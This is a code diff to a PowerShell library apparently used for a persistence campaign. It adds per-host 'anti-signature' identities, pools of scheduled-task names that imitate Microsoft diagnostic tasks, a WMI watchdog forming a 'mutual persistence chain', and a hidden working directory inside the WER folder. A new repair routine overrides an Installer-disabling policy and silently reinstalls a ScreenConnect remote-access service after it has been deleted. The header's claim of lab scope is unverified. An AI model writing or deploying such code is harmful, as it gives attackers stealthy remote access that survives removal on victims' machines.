@@ -1,30 +1,37 @@
 #Requires -Version 5.1
 # ═══════════════════════════════════════════════════════════════
-# OWN_LIB  BUILD 20260802L1
+# OWN_LIB  BUILD 20260802L2
 # Shared library: per-host identity (anti-signature), WMI watchdog
-# (mutual persistence chain), campaign state file.
+# (mutual persistence chain), campaign state file, SC service repair.
+# L2: safe task-name pools (parents exist on all Win10/11), IDENTVER
+# regeneration, -Action repair recreates deleted SC services via
+# msiexec /fa {GUID} (never triggers SC-family major-upgrade removal).
 # Authorized internal deployment - lab/competition scope only.
 # ═══════════════════════════════════════════════════════════════
 [CmdletBinding()]
 param(
     [Parameter(Mandatory = $true)]
-    [ValidateSet('init', 'watchdog', 'watchdog-ensure', 'state', 'identity')]
+    [ValidateSet('init', 'watchdog', 'watchdog-ensure', 'state', 'identity', 'repair')]
     [string]$Action,
     [string]$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
     [string]$MonPath = '',
     [string]$Build  = 'O15',
-    [string]$Extra  = ''
+    [string]$Extra  = '',
+    [string]$Fp     = ''
 )
 
 $ErrorActionPreference = 'SilentlyContinue'
 $cfgPath = Join-Path $WorkDir 'identity.cfg'
+$IdentVersion = 2
 
 # Legit-looking task-name pools; per-host hash picks one per slot.
+# v2: ONLY parent folders that exist on every Win10/11 (WwanSvc/MemoryDiagnostic/
+# PowerEfficiency/DiskDiagnostic parents are absent on some machines -> /Create failed).
 $Pools = @{
-    A = @('\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\PLA\Server Diagnostics','\Microsoft\Windows\DiskDiagnostic\Resolver','\Microsoft\Windows\MemoryDiagnostic\CorruptionDetector','\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem')
-    B = @('\Microsoft\Windows\PLA\Server','\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\DiskDiagnostic\Resolver','\Microsoft\Windows\MemoryDiagnostic\CorruptionVerifier','\Microsoft\Windows\WwanSvc\Notification')
-    C = @('\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\Tcpip\IpAddressConflict1','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\PLA\Server','\Microsoft\Windows\WwanSvc\Notification','\Microsoft\Windows\DiskDiagnostic\Resolver','\Microsoft\Windows\Diagnosis\Scheduled')
-    D = @('\Microsoft\Windows\Tcpip\IpAddressConflict1','\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\WwanSvc\Notification','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\PLA\Server','\Microsoft\Windows\DiskDiagnostic\Resolver','\Microsoft\Windows\Diagnosis\Scheduled')
+    A = @('\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\PLA\Server Diagnostics','\Microsoft\Windows\Tcpip\IpAddressConflict1','\Microsoft\Windows\PLA\Server','\Microsoft\Windows\Diagnosis\SRTask')
+    B = @('\Microsoft\Windows\PLA\Server','\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\Tcpip\IpAddressConflict2','\Microsoft\Windows\PLA\Server Diagnostics','\Microsoft\Windows\Diagnosis\SRTask')
+    C = @('\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\Tcpip\IpAddressConflict1','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\PLA\Server','\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\PLA\Server Diagnostics','\Microsoft\Windows\Diagnosis\SRTask')
+    D = @('\Microsoft\Windows\Tcpip\IpAddressConflict1','\Microsoft\Windows\WDI\ResolutionHost','\Microsoft\Windows\NetTrace\GatherNetworkInfo','\Microsoft\Windows\Diagnosis\BVTConsumer','\Microsoft\Windows\PLA\Server','\Microsoft\Windows\Diagnosis\Scheduled','\Microsoft\Windows\PLA\Server Diagnostics','\Microsoft\Windows\Diagnosis\SRTask')
 }
 $Defaults = [ordered]@{
     TASK_A = '\Microsoft\Windows\Diagnosis\Scheduled'
@@ -44,16 +51,26 @@ function Get-HostSeed {
 function Read-Identity {
     $id = $Defaults.Clone()
     if (Test-Path $cfgPath) {
-        foreach ($line in (Get-Content -LiteralPath $cfgPath)) {
+        foreach ($line in (Get-Content -LiteralPath $cfgPath -Force)) {
             if ($line -match '^\s*([A-Z_]+)\s*=\s*(.+?)\s*$') { $id[$matches[1]] = $matches[2] }
         }
     }
     return $id
 }
 
+function Remove-TaskQuiet([string]$tn) {
+    if ($tn) { & schtasks.exe /Delete /TN $tn /F 2>&1 | Out-Null }
+}
+
 function Initialize-Identity {
-    # Idempotent: identity must never change once written (tasks depend on it).
-    if (Test-Path $cfgPath) { return (Read-Identity) }
+    # Idempotent within an IDENTVER generation. Pool upgrades bump IDENTVER:
+    # old-name tasks are deleted, then identity is regenerated from the same seed.
+    if (Test-Path $cfgPath) {
+        $old = Read-Identity
+        if ($old['IDENTVER'] -eq "$IdentVersion") { return $old }
+        foreach ($k in 'TASK_A','TASK_B','TASK_C','TASK_D') { Remove-TaskQuiet $old[$k] }
+        Remove-Item -LiteralPath $cfgPath -Force
+    }
     $s = Get-HostSeed
     $cfg = @(
         "TASK_A=$($Pools.A[$s % 8])"
@@ -63,6 +80,7 @@ function Initialize-Identity {
         "MO_A=$(2 + ($s % 4))"          # 2-5 min jitter
         "MO_B=$(3 + (($s + 1) % 3))"    # 3-5 min jitter
         "SEED=$s"
+        "IDENTVER=$IdentVersion"
     )
     Set-Content -LiteralPath $cfgPath -Value $cfg -Force
     return (Read-Identity)
@@ -92,6 +110,31 @@ function Ensure-Watchdog {
         return 'REARMED'
     }
     return 'OK'
+}
+
+function Repair-SCService([string]$Fingerprint) {
+    # Recreates a deleted SC service entry by repairing the REGISTERED product.
+    # msiexec /fa {GUID} repairs in place - it does NOT run the SC-family
+    # major-upgrade removal, so other instances are untouched.
+    if (-not $Fingerprint) { return 'no-fp' }
+    $name = "ScreenConnect Client ($Fingerprint)"
+    if (Get-Service -Name $name -ErrorAction SilentlyContinue) { return 'svc-present' }
+    $guid = $null
+    foreach ($root in 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
+                      'HKLM:\SOFTWARE\WOW6432Node\CurrentVersion\Uninstall') {
+        Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
+            $dn = (Get-ItemProperty $_.PSPath).DisplayName
+            if ($dn -and $dn -like "*$name*" -and $_.PSChildName -like '{*}') { $guid = $_.PSChildName }
+        }
+    }
+    if (-not $guid) { return 'not-registered' }
+    & reg.exe delete 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /f 2>&1 | Out-Null
+    & reg.exe add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer' /v DisableMSI /t REG_DWORD /d 0 /f 2>&1 | Out-Null
+    $log = Join-Path $WorkDir "msi_repair_$Fingerprint.log"
+    $p = Start-Process msiexec.exe -ArgumentList "/fa $guid /qn /norestart /L*v `"$log`"" -Wait -PassThru
+    Start-Sleep -Seconds 8
+    if (Get-Service -Name $name -ErrorAction SilentlyContinue) { return "svc-restored exit=$($p.ExitCode)" }
+    return "svc-still-missing exit=$($p.ExitCode)"
 }
 
 function Update-State {
@@ -148,4 +191,5 @@ switch ($Action) {
     'watchdog'        { Install-Watchdog | Out-Null }
     'watchdog-ensure' { Ensure-Watchdog }
     'state'           { Update-State | ConvertTo-Json -Compress }
+    'repair'          { Repair-SCService $Fp }
 }
